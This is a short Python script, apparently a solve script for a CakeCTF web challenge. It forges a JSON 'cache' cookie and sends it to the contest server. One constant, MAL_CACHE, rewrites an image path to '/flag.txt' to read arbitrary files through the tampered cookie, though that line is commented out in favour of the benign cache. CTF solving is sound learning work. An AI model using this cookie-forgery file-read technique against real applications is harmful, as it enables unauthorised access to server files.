import urllib.parse
import requests


CACHE = '{"data":[{"name":"images\\/01.jpg","description":"Half sleeping cat"},{"name":"images\\/02.jpg","description":"When you gaze into the cat, the cat gazes into you"},{"name":"images\\/03.jpg","description":"Fox villege :)"},{"name":"images\\/04.jpg","description":"TV cat"},{"name":"images\\/05.jpg","description":"Smiling emu"},{"name":"images\\/06.jpg","description":"This lemur often sits someone\'s shoulder"},{"name":"images\\/07.jpg","description":"Capybara is not as fluffy as you may imagine"},{"name":"images\\/08.jpg","description":"There were several serval cats"},{"name":"images\\/09.jpg","description":"Neko cafe @ Akihabara"}],"expiry":1630721147}'

MAL_CACHE = '{"data":[{"name":"\\/flag.txt","description":"Half sleeping cat"},{"name":"images\\/02.jpg","description":"When you gaze into the cat, the cat gazes into you"},{"name":"images\\/03.jpg","description":"Fox villege :)"},{"name":"images\\/04.jpg","description":"TV cat"},{"name":"images\\/05.jpg","description":"Smiling emu"},{"name":"images\\/06.jpg","description":"This lemur often sits someone\'s shoulder"},{"name":"images\\/07.jpg","description":"Capybara is not as fluffy as you may imagine"},{"name":"images\\/08.jpg","description":"There were several serval cats"},{"name":"images\\/09.jpg","description":"Neko cafe @ Akihabara"}],"expiry":1630721147}'


PHPSESSID = '7f16d7a58918baa873b6315912723605'


def main():
    # payload = urllib.parse.quote_plus(MAL_CACHE)
    payload = urllib.parse.quote_plus(CACHE)
    print(payload)
    cookies = {
            'cache': payload,
            'PHPSESSID': PHPSESSID,
            }
    res = requests.get('http://web.cakectf.com:8003/', cookies=cookies)
    print(res.text)


if __name__ == '__main__':
    main()
